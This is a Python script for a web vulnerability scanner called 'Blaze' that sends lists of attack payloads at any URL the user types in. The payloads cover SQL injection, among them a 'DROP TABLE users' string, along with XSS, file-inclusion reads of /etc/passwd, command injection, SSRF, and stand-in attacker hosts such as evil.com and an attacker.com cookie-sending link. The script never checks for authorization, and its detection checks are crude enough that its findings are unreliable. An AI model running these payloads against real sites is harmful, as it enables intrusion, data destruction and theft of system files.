import requests
from bs4 import BeautifulSoup
import urllib.parse
import time

# Banner for Blaze with Author Name in Red
print("""
\033[91m
#######      ##            ##      ##########  #########
##      ##   ##           ## ##           ##   ##
##       ##  ##          ##   ##         ##    ##
##      ##   ##         ##     ##       ##     ##
########     ##         #########      ##      #########
##      ##   ##         ##     ##     ##       ##
##       ##  ##         ##     ##    ##        ##
##      ##   ##         ##     ##   ##         ##
#######      #########  ##     ##  #########   #########


Author: AYUSH SINGH
\033[0m
""")

# Advanced Payloads
SQL_PAYLOADS = [
    "' OR '1'='1", "' AND 1=1 --", "' OR '1'='1' --", "'; DROP TABLE users--",
    "' UNION SELECT NULL, username, password FROM users--", "admin'--", "' OR 1=1#",
    "' AND sleep(5)--", "' AND BENCHMARK(1000000,MD5('X'))--"  # Blind SQLi and time-based
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>", "<a href='javascript:alert(1)'>Click me</a>"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd", "../../../../windows/system32/config/system", "../../../../proc/self/environ",
    "../../../var/log/syslog", "../../../../etc/hosts"  # Additional LFI payloads
]

RFI_PAYLOADS = [
    "http://evil.com/malicious.php", "http://attacker.com/malicious_file.php"
]

COMMAND_INJECTION_PAYLOADS = [
    "ls", "cat /etc/passwd", "echo 'malicious code' > /tmp/hacked.txt", "id",
    "ping -c 4 127.0.0.1"  # Additional command injection payload
]

CSWSH_PAYLOADS = [
    "ws://malicious.com", "ws://evil.com"
]

OPEN_REDIRECT_PAYLOADS = [
    "http://malicious.com", "http://attacker.com"
]

SESSION_FIXATION_PAYLOADS = [
    "PHPSESSID=malicioussession", "JSESSIONID=malicioussession"
]

# Function to handle SQL Injection testing
def scan_sql_injection(url):
    print("\033[92m[+] Testing for SQL Injection...\033[0m")
    for payload in SQL_PAYLOADS:
        test_url = f"{url}?q={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                print(f"\033[91m[!] Potential SQL Injection detected with payload: {payload}\033[0m")
            elif "sleep" in response.text.lower() or "benchmark" in response.text.lower():
                print(f"\033[91m[!] Potential Blind SQL Injection detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to handle XSS testing
def scan_xss(url):
    print("\033[92m[+] Testing for Cross-Site Scripting (XSS)...\033[0m")
    for payload in XSS_PAYLOADS:
        test_url = f"{url}?q={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                print(f"\033[91m[!] Potential XSS vulnerability detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to check for Local File Inclusion (LFI)
def scan_lfi(url):
    print("\033[92m[+] Testing for Local File Inclusion (LFI)...\033[0m")
    for payload in LFI_PAYLOADS:
        test_url = f"{url}?file={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "root:" in response.text or "system32" in response.text or "etc" in response.text:
                print(f"\033[91m[!] Potential Local File Inclusion vulnerability detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to check for Remote File Inclusion (RFI)
def scan_rfi(url):
    print("\033[92m[+] Testing for Remote File Inclusion (RFI)...\033[0m")
    for payload in RFI_PAYLOADS:
        test_url = f"{url}?file={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "error" in response.text.lower() or "php" in response.text.lower():
                print(f"\033[91m[!] Potential Remote File Inclusion vulnerability detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to check for Command Injection
def scan_command_injection(url):
    print("\033[92m[+] Testing for Command Injection...\033[0m")
    for payload in COMMAND_INJECTION_PAYLOADS:
        test_url = f"{url}?command={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "root:" in response.text or "uid=" in response.text:
                print(f"\033[91m[!] Potential Command Injection detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to check for Cross-Site WebSocket Hijacking (CSWSH)
def scan_cswsn(url):
    print("\033[92m[+] Testing for Cross-Site WebSocket Hijacking (CSWSH)...\033[0m")
    for payload in CSWSH_PAYLOADS:
        test_url = f"{url}?ws={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "ws://evil.com" in response.text:
                print(f"\033[91m[!] Potential CSWSH vulnerability detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to check for Open Redirect vulnerability
def scan_open_redirect(url):
    print("\033[92m[+] Testing for Open Redirect...\033[0m")
    for payload in OPEN_REDIRECT_PAYLOADS:
        test_url = f"{url}?redirect={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "malicious.com" in response.text or "attacker.com" in response.text:
                print(f"\033[91m[!] Potential Open Redirect vulnerability detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to check for Session Fixation
def scan_session_fixation(url):
    print("\033[92m[+] Testing for Session Fixation...\033[0m")
    for payload in SESSION_FIXATION_PAYLOADS:
        test_url = f"{url}?PHPSESSID={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "logged in" in response.text:
                print(f"\033[91m[!] Potential Session Fixation vulnerability detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to handle CSRF testing (basic example)
def scan_csrf(url):
    print("\033[92m[+] Testing for Cross-Site Request Forgery (CSRF)...\033[0m")
    csrf_payload = "<img src='http://attacker.com/csrf?cookie=" + urllib.parse.quote(url) + "' />"
    try:
        response = requests.get(url, params={'q': csrf_payload}, timeout=5)
        if csrf_payload in response.text:
            print(f"\033[91m[!] Potential CSRF vulnerability detected.\033[0m")
    except Exception as e:
        pass

# Function to check for SSRF (Server-Side Request Forgery)
def scan_ssrf(url):
    print("\033[92m[+] Testing for SSRF...\033[0m")
    ssrf_payloads = [
        "http://localhost:80", "http://127.0.0.1", "http://evil.com"
    ]
    for payload in ssrf_payloads:
        test_url = f"{url}?url={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "localhost" in response.text or "127.0.0.1" in response.text:
                print(f"\033[91m[!] Potential SSRF vulnerability detected with payload: {payload}\033[0m")
        except Exception as e:
            pass

# Function to find forms and attempt XSS and SQL injections
def find_forms(url):
    print("\033[92m[+] Searching for forms...\033[0m")
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        if forms:
            print(f"\033[92m[+] Found {len(forms)} forms on the page.\033[0m")
            for form in forms:
                action = form.get('action')
                method = form.get('method').lower()
                inputs = form.find_all("input")
                print(f"\033[92m[+] Form found with method {method} and action {action}\033[0m")
                for input_field in inputs:
                    if input_field.get('name'):
                        print(f"\033[92m[+] Input field: {input_field.get('name')}\033[0m")
                        if method == "get":
                            # Test GET method for XSS and SQLi
                            scan_sql_injection(url + action)
                            scan_xss(url + action)
                        elif method == "post":
                            # Test POST method (simple example)
                            scan_sql_injection(url + action)
                            scan_xss(url + action)
        else:
            print("\033[92m[-] No forms found on the page.\033[0m")
    except Exception as e:
        pass

if __name__ == "__main__":
    target_url = input("\033[92mEnter the target URL : \033[0m").strip()

    # Perform vulnerability scanning
    find_forms(target_url)
    scan_sql_injection(target_url)
    scan_xss(target_url)
    scan_lfi(target_url)
    scan_rfi(target_url)
    scan_command_injection(target_url)
    scan_cswsn(target_url)
    scan_open_redirect(target_url)
    scan_session_fixation(target_url)
    scan_csrf(target_url)
    scan_ssrf(target_url)

    print("\033[92m[+] Scanning completed.\033[0m")